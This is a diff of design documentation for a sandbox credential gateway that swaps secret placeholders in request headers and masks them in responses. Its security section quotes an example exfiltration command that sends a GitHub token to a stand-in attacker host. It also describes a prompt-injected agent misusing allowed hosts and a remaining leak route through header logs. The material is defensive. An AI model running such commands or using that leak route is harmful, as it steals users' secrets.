@@ -112,8 +112,8 @@ id. See [tools](tools.md#mcp) for MCP tools.
 
 | Field | Rules |
 | --- | --- |
-| `auth.secret_name` | The environment variable name in the sandbox. It matches `^[A-Za-z_][A-Za-z0-9_]*$` and is unique in the vault (`400` `secret_name_collision` otherwise). Reserved names are `400`: any name that starts with `OPENAI_`, `APIPI_`, `PI_`, or `CODEX_`, and `PATH`, `HOME`, `USER`, `SHELL`, `PWD`, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `NODE_OPTIONS`, `DATABASE_URL`, `SSL_CERT_FILE`, `REQUESTS_CA_BUNDLE`, `GIT_SSL_CAINFO`, and `NODE_EXTRA_CA_CERTS`. |
-| `auth.secret_value` | The secret, a non-empty string of at most 16,384 characters. Control characters and line breaks are `400`, because the value goes into HTTP headers. Never returned. |
+| `auth.secret_name` | The environment variable name in the sandbox. It matches `^[A-Za-z_][A-Za-z0-9_]*$` and is unique in the vault (`400` `secret_name_collision` otherwise). Reserved names are `400`, because ApiPi or guest init sets them: any name that starts with `OPENAI_`, `APIPI_`, `PI_`, or `CODEX_`; `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>`, and `GIT_CONFIG_VALUE_<n>`; and `PATH`, `HOME`, `USER`, `SHELL`, `PWD`, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `NODE_OPTIONS`, `DATABASE_URL`, `SSL_CERT_FILE`, `REQUESTS_CA_BUNDLE`, `GIT_SSL_CAINFO`, `NODE_EXTRA_CA_CERTS`, `CURL_CA_BUNDLE`, `NPM_CONFIG_CACHE`, `npm_config_cache`, `UV_CACHE_DIR`, and the guest init variables `WS`, `CA_BUNDLE`, `CA_DIR`, and `cmd`. |
+| `auth.secret_value` | The secret: 8 to 16,384 characters of printable ASCII (`!` to `~`), without spaces, line breaks, or other control characters. Otherwise `400`. The value goes into HTTP headers, and the gateway masks it in responses, so a very short value could hide ordinary text. Never returned. |
 | `auth.networking.type` | Must be `limited`. |
 | `auth.networking.allowed_hosts` | 1 to 100 exact hostnames such as `api.github.com`. No scheme, port, path, or wildcard. IP addresses are `400`. Names are stored in lowercase, and duplicates are dropped. |
 | `metadata` | Optional key-value map, as on vaults. ApiPi reads one key: `apipi.git_username`, the user name that the git credential helper sends for this credential's hosts. It is only valid on `environment_variable` credentials. It must not contain a colon, a line break, or surrounding spaces. |
@@ -211,10 +211,11 @@ isolation `microvm`. The worker runs an egress gateway next to each
 sandbox, and iptables sends all guest TCP to ports 80, 443, and 8443
 to it. The guest needs no proxy settings. The gateway is described in
 [environments](environments.md#vault-credentials-and-the-network) and
-[configuration](config.md#networking). A worker with a custom
-isolation backend has no egress gateway, so a sandbox with
-environment credentials fails to start there with an error that names
-the isolation.
+[configuration](config.md#networking). The API sends environment
+credentials only to workers that run
+isolation `microvm` (see [requirements](#requirements)). If one still
+reaches a worker without an egress gateway, the sandbox does not start
+and the error code is `credential_not_allowed`.
 
 When the sandbox starts, the worker does this for the credentials it
 received from the API:
@@ -231,7 +232,8 @@ received from the API:
    credentials' `allowed_hosts`. The gateway answers those
    connections with a certificate from the worker's own certificate
    authority. Guest init joins that authority with the image's system
-   authorities into `/run/apipi/ca-bundle.pem` and points
+   authorities into `/run/apipi/ca-bundle.pem` (or `/tmp/apipi/ca-bundle.pem`
+   when the image cannot mount `/run`) and points
    `SSL_CERT_FILE`, `REQUESTS_CA_BUNDLE`, `GIT_SSL_CAINFO`,
    `NODE_EXTRA_CA_CERTS`, and `CURL_CA_BUNDLE` at it. This needs a
    guest image built from this ApiPi version or later.
@@ -246,12 +248,30 @@ credential's `allowed_hosts`, the gateway:
    base64 `user:password`, replaces, and encodes it again), so
    `Bearer`, `token`, custom headers such as `X-Api-Key`, and git over
    HTTPS all work,
-2. replaces the placeholder in the query string,
-3. never changes the path or the request body,
+2. never changes the request line (path and query string) or the
+   request body,
+3. asks the server for an uncompressed response (`Accept-Encoding:
+   identity`),
 4. connects to the real host, checks its real certificate, and sends
    the request,
 5. replaces the secret with the placeholder again in the response
-   headers.
+   headers and in the response body.
+
+The query string is not substituted on purpose. Many APIs accept form
+fields in the query string and store or show them, for example an
+issue title, a search term, or a repository description. If the
+gateway put the secret there, the agent could make the service write
+the real secret into a page that it or other users can read.
+
+To mask the response body, the gateway streams it and replaces every
+copy of a secret with its placeholder, also when a copy is split
+between two network reads. Because the length changes, it removes
+`Content-Length` and sends the body with chunked transfer encoding. If
+the server still compresses the body with `gzip` or `deflate`, the
+gateway decompresses it first and removes `Content-Encoding`. Any other
+encoding, such as `br`, fails the request with `502` and is logged as
+`event=egress.encoding_rejected`. Responses without a body (`HEAD`,
+`204`, `304`) are passed as they are.
 
 A request with the placeholder to any other host goes out unchanged,
 and the placeholder alone is worthless. Plain HTTP on port 80 never
@@ -275,16 +295,19 @@ secret. The guest environment configures git through
 `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>`, and `GIT_CONFIG_VALUE_<n>`.
 For each credential host it sets:
 
-- `credential.https://<host>.helper` to the helper, so git asks it only
-  for that host,
+- `credential.https://<host>.helper` and
+  `credential.https://<host>:8443.helper` to the helper, so git asks it
+  only for that host on the two ports the gateway intercepts,
 - `url.https://<host>/.insteadOf` to `git@<host>:` and to
   `ssh://git@<host>/`, so a clone URL copied from the SSH tab uses
   HTTPS and goes through the gateway.
 
 If `environment.env` already sets `GIT_CONFIG_COUNT` and its keys, the
 worker appends its entries after them. The helper answers only `get`
-requests for `https` URLs of a listed host. It ignores `store` and
-`erase`, so git cannot save the placeholder anywhere.
+requests for `https` URLs of a listed host (with or without port 443
+or 8443). It ignores `store` and `erase`, so it never saves anything
+itself. Another credential helper that the agent configures could
+still store the placeholder, which is harmless outside this sandbox.
 
 The user name is `apipi.git_username` from the credential metadata
 when it is set. Without it, the helper uses `oauth2` for `gitlab.com`
@@ -309,6 +332,13 @@ The API checks the operator allowlist with its own
 `APIPI_MICROVM_EGRESS_ALLOWLIST` and `APIPI_MICROVM_EGRESS_HOSTS`, so
 set them to the same values on the API and on the workers. The worker
 checks the network policy again when the sandbox starts.
+
+When the API sends a turn, a follow-up, or a sandbox start to a worker,
+it also checks the worker: a session with environment credentials needs
+a worker that runs isolation `microvm`. A worker with isolation `none`
+or a custom backend gets no command, and the request fails with `400`
+and code `credential_not_allowed`. The API cannot check this at session
+create, because `apipi serve` has no run mode of its own.
 
 A vault can change after the session was created. The API checks the
 same rules again every time it builds a command for the worker, and a
@@ -343,8 +373,12 @@ the credentials. Upgrade the workers. See
 
 ### Limits
 
-Environment credentials cover APIs that take a key in a header or in
-the query string. They do not cover:
+Environment credentials cover APIs that take a key in a request header,
+including Basic auth. They do not cover:
+
+- Keys in the query string, such as `?key=...` or `?access_token=...`.
+  The gateway never substitutes the query string (see above). Most APIs
+  that accept a query key also accept a header.
 
 - Request signing, such as AWS Signature Version 4 or HMAC-signed
   webhooks. The client computes the signature from the secret, and the
@@ -366,9 +400,6 @@ the query string. They do not cover:
   their own list of trusted authorities and ignore `SSL_CERT_FILE`
   (some Java and Rust programs). The TLS handshake with the gateway
   fails. Connections to hosts without a credential are not affected.
-- Secrets in response bodies. The gateway masks the secret only in
-  response headers. Do not use a credential with an API that returns
-  the secret in a response body.
 - Local use of the value. Code that hashes the secret, or checks its
   format before it sends it, sees only the placeholder.
 
@@ -380,13 +411,24 @@ context, the transcript, or the logs. The gateway logs and counts each
 injection with the credential id and the host, never the value or the
 placeholder. Secret values are also masked in payload exports.
 
-Because the guest only has a placeholder, a prompt injection cannot
-steal the secret. A command such as `env`, `cat /proc/self/environ`,
-or `curl https://attacker.example/?k=$GITHUB_TOKEN` shows or sends only
-the placeholder, which is worthless outside this sandbox and changes
-on the next start.
+The guest only has a placeholder. A command such as `env`,
+`cat /proc/self/environ`, or
+`curl https://attacker.example/?k=$GITHUB_TOKEN` shows or sends only
+the placeholder, which is worthless outside this sandbox and changes on
+the next start. The gateway also keeps the secret from coming back
+through the credential hosts: it never puts the secret into the path,
+the query string, or the body of a request, and it masks the secret in
+the response headers and the response body before the guest sees them.
 
-The agent can still use the token's rights on the allowed hosts. A
+This does not make a leak impossible. The agent decides which request
+header carries the placeholder, and the gateway replaces it in every
+header value. A credential host that stores an arbitrary request header
+and shows it somewhere other than in the response (for example a request
+log, an audit page, or a webhook delivery view that other users can
+read) could still expose the real secret there. Choose
+`allowed_hosts` that you trust with the token, and keep the list short.
+
+The agent can always use the token's rights on the allowed hosts. A
 prompt injection that controls the agent could push to a repository,
 delete a branch, or copy data from the workspace into a public issue or
 gist on an allowed host. ApiPi does not filter what the agent does with
@@ -395,6 +437,7 @@ a credential. Protect yourself on the service side:
 - Scope tokens tightly: only the repositories, projects, and
   permissions the task needs. Prefer fine-grained tokens, project or
   repository tokens, and short-lived tokens.
+- Keep `allowed_hosts` to the hosts that really need the token.
 - Use server-side guards, such as branch protection that requires a
   review before a merge, and protected tags.
 - Use one vault per purpose, and attach only the vaults that a session
@@ -407,7 +450,7 @@ a credential. Protect yourself on the service side:
 | Who uses the secret | The host broker, for calls to one MCP server | Any program in the sandbox, through the egress gateway |
 | What the model sees | MCP tools with names and schemas | A shell and the programs it runs |
 | Session types | `none` and `openai_hosted` | `openai_hosted` on isolation `microvm` only |
-| Authentication | `Authorization: Bearer <token>` | Any request header, Basic auth, or query string on allowed hosts |
+| Authentication | `Authorization: Bearer <token>` | Any request header, including Basic auth, on allowed hosts |
 | Network policy | Not needed: the guest only reaches the broker | Needs `network.access` `enabled` or `restricted` |
 | Good for | A curated set of actions, servers that already speak MCP, sessions without a computer | `git`, CLIs (`gh`, `glab`, `tea`, `npm`), SDKs, and scripts the model writes |
 
@@ -579,7 +622,8 @@ allowlist on, also allow the host on the API and on the workers:
 ```
 APIPI_MICROVM_EGRESS_PRIVATE_HOSTS=git.example.com
 APIPI_MICROVM_EGRESS_UPSTREAM_CA=/etc/apipi/internal-ca.pem
-APIPI_MICROVM_EGRESS_HOSTS=git.example.com   # only with APIPI_MICROVM_EGRESS_ALLOWLIST=true
+# only with APIPI_MICROVM_EGRESS_ALLOWLIST=true:
+APIPI_MICROVM_EGRESS_HOSTS=git.example.com
 ```
 
 The same in `apipi.toml`:
@@ -610,8 +654,10 @@ For a self-hosted GitLab, set `apipi.git_username` to `oauth2`.
 
 ### Other services
 
-The same pattern works for any HTTPS API that takes a key in a header
-or the query string. The table lists common choices. Use only the
+The same pattern works for any HTTPS API that takes a key in a request
+header, including Basic auth. An API that only accepts the key in the
+query string does not work, because the gateway never substitutes the
+query string. The table lists common choices. Use only the
 hosts the tool really calls with the key.
 
 | Service | `secret_name` | `allowed_hosts` | Use in the sandbox |
@@ -633,11 +679,12 @@ hosts the tool really calls with the key.
 
 A few details matter for these tools:
 
-- A token inside a URL works only when the client turns the user
-  part of the URL into an `Authorization: Basic` header, as pip, uv,
-  and git do. The gateway replaces the placeholder there. A client that
-  sends the URL somewhere else, for example inside a request body, sends
-  only the placeholder.
+- A token in the user part of a URL (`https://user:${TOKEN}@host/...`)
+  works when the client turns it into an `Authorization: Basic` header,
+  as pip, uv, and git do. The gateway replaces the placeholder there. A
+  token in the query string (`?key=...`) is never replaced, and a client
+  that sends the URL somewhere else, for example inside a request body,
+  sends only the placeholder.
 - Names that start with `OPENAI_` are reserved for ApiPi. For an
   OpenAI-compatible provider in a script, pick another name and pass it
   to the client, as in the table.
